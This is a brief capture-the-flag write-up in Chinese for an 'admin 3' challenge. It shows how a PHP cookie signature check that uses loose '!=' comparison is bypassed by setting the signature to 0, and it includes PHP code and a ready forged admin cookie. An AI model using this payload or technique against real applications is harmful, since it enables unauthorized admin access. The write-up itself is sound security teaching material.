admin 3
===


從以下的 Code 看出端倪
```PHP
function load_user()
{
    global $secret, $error;

    if(empty($_COOKIE['user'])) {
        return null;
    }

    $unserialized = json_decode(base64_decode($_COOKIE['user']), true);
    $r = hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig'];

    if(hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig']) {
        $error = 'Invalid session';
        return false;
    }

    $data = json_decode($unserialized['data'], true);
    return [
        'name' => $data[0],
        'admin' => $data[1]
    ];
}
```

有弱點的程式碼位於
```php
if(hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig']) {
    $error = 'Invalid session';
    return false;
}
```
由於 `sig` 與 `data` 可控，並且使用 `!=` 弱比較，所以可輕易繞過，Payload 如下

```php
$user = ['admin', true];
$data = json_encode($user);
$sig = 0;
$all = base64_encode(json_encode(['sig' => $sig, 'data' => $data]));
echo $all;
```

並將 `cookie` 的 `user` 改為 `eyJzaWciOjAsImRhdGEiOiJbXCJhZG1pblwiLHRydWVdIn0=` 重新整理就會得到 Flag。